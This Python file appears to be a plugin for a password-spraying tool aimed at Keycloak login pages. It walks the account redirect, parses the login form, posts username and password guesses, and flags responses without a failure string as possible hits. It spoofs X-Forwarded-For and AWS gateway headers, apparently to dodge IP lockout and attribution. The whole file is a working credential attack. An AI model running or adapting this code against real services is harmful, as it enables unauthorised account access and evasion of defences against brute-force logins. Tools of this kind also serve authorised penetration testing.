import requests
from bs4 import BeautifulSoup
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def keycloak_authenticate(url, username, password, useragent, pluginargs):
    # not all of these are used, provided for future dev if needed
    # Only ones necessary to return at the moment are:
    # error
    # output
    # success
    # valid_user
    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)
    
    try:

        realm = pluginargs["realm"]
        failure_string = pluginargs["failure-string"]

        ACCOUNT_URL = f"{url}auth/realms/{realm}/account"

        session = requests.Session()
        session.headers.update(headers)

        # Emitting the first request to the target realm "account" service.
        # This should return a 302 Redirect (if not, the Keycloak installation is different and we should abort)
        r = session.get(ACCOUNT_URL.replace(pluginargs['url'], url), allow_redirects=False, verify=False, proxies=pluginargs["proxy"])
        if r.status_code != 302:
            print("[!] Account service request did not return expected 302 - Keycloak installation may be different. Investigate if there are a lot of this.")
            raise Exception("[!] Account service request did not return expected 302 - Keycloak installation may be different. Investigate if there are a lot of this.")

        redirect_target = r.headers["Location"]

        # Emitting the second request to generated redirect URL
        # This should return a 200 OK, set 3 cookies and include the HTML form "kc-form-login"
        r = session.get(redirect_target.replace(pluginargs['url'], url), verify=False, proxies=pluginargs["proxy"])
        if r.status_code != 200:
            print("[!] Something went wrong during redirect request, which did not return expected 200. Investigate if there are a lot of this.")
            raise Exception("[!] Something went wrong during redirect request, which did not return expected 200. Investigate if there are a lot of this.")

        parser = BeautifulSoup(r.text, "html.parser")
        login_form = parser.find('form', id='kc-form-login')
        if login_form:
            action_value = login_form.get('action')
        else:
            print("[!] Could not find expected login form in redirect request response. Investigate if there are a lot of this.")
            raise Exception("[!] Could not find expected login form in redirect request response. Investigate if there are a lot of this.")

        # Emitting the third final request to actually perform the login attempt from action URL
        # Upon failure, this will return a 200 OK response containing the failure string
        payload = {"username": username, "password": password, "credentialId": ""}
        for cookie in session.cookies:
            # WARNING: MAKE SURE IT WORKS FINE TO RETRIEVE THE NEW PATH
            cookie.path = f'/{url.split("/", 3)[3]}{cookie.path[1:]}'
            session.cookies.set_cookie(cookie)
        r = session.post(action_value.replace(pluginargs['url'], url), data=payload, verify=False, proxies=pluginargs["proxy"])
        
        if r.status_code != 200:
            data_response['result'] = "potential"
            data_response['output'] = f"[?] POTENTIAL - The login request returned a {r.status_code} code instead of the expected 200 which might indicate a success.: => {username}:{password}"

        elif failure_string in r.text:
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE (expected failure string returned) => {username}:{password}"
        
        else:
            data_response['result'] = "potential"
            data_response['output'] = f"[?] POTENTIAL - The login request returned a 200 response that does not contain expected failure string => {username}:{password}"

    except Exception as ex:
        import traceback
        print(traceback.print_exc())
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
